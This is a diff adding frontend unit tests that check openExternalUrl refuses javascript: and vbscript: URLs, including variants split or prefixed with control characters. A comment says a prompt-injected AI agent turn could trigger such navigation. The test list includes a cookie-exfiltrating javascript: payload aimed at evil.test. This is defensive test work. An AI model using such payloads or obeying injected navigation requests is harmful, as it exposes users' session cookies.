@@ -436,3 +436,89 @@ describe('openExternalUrl: external link target modes', () => {
     expect(window.location.href).toBe(APP_URL);
   });
 });
+
+// A scripted url reaching `window.open` runs in the workspace's own origin: the
+// new context inherits the opener's. The engine puts no scheme constraint on
+// `navigate_ui`'s url, so a prompt-injected turn picks the value and no user
+// gesture is involved. See `utils/dangerousUrlScheme.ts`.
+describe('openExternalUrl: a scripted scheme is refused, in every mode', () => {
+  // Built rather than written as escapes, so the control character under test
+  // is unambiguous in the source.
+  const TAB = String.fromCharCode(9);
+  const LF = String.fromCharCode(10);
+  const NUL = String.fromCharCode(0);
+
+  const SCRIPTED = [
+    'javascript:fetch("https://evil.test/"+document.cookie)',
+    'JavaScript:alert(1)',
+    'vbscript:msgbox(1)',
+    // `new URL(...).href` drops leading C0 controls and interior tabs and
+    // newlines, so the sink sees a bare `javascript:` for each of these.
+    ' javascript:alert(1)',
+    NUL + 'javascript:alert(1)',
+    'java' + TAB + 'script:alert(1)',
+    'java' + LF + 'script:alert(1)',
+  ];
+
+  beforeEach(() => {
+    platformMocks.isIOSPwa = false;
+    prefMocks.target = 'safari';
+    windowOpen.mockReset();
+    windowOpen.mockReturnValue(fakeWindow());
+    toastMocks.showToast.mockClear();
+    fakeLocation = { href: APP_URL };
+    vi.stubGlobal('open', windowOpen);
+    vi.stubGlobal('location', fakeLocation);
+  });
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+  });
+
+  it('never reaches window.open and never navigates the document', () => {
+    for (const url of SCRIPTED) {
+      openExternalUrl(url);
+    }
+
+    expect(windowOpen).not.toHaveBeenCalled();
+    expect(window.location.href).toBe(APP_URL);
+    expect(toastMocks.showToast).toHaveBeenCalledTimes(SCRIPTED.length);
+  });
+
+  it('refuses on an installed iOS PWA too, before any hand-off branch', () => {
+    platformMocks.isIOSPwa = true;
+
+    for (const target of ['safari', 'ask', 'in-app'] as const) {
+      prefMocks.target = target;
+      windowOpen.mockClear();
+      openExternalUrl('javascript:alert(1)');
+      expect(windowOpen).not.toHaveBeenCalled();
+      expect(window.location.href).toBe(APP_URL);
+    }
+  });
+
+  it('the toast names what asked, so an SSE navigate is not unattributed', () => {
+    openExternalUrl('javascript:alert(1)', 'thread "Read my email"');
+
+    expect(toastMocks.showToast).toHaveBeenCalledWith(
+      'Refused to open a scripted url (requested by thread "Read my email")',
+      'error',
+    );
+  });
+
+  it('leaves the legitimate non-http schemes openExternalUrl documents alone', () => {
+    const allowed = [
+      'mailto:someone@example.com',
+      'tel:+15550000',
+      'file:///tmp/report.pdf',
+      'data:text/plain,hi',
+      'https://example.com/javascript:not-a-scheme',
+    ];
+
+    for (const url of allowed) {
+      openExternalUrl(url);
+      expect(windowOpen).toHaveBeenLastCalledWith(url, '_blank');
+    }
+    expect(windowOpen).toHaveBeenCalledTimes(allowed.length);
+  });
+});
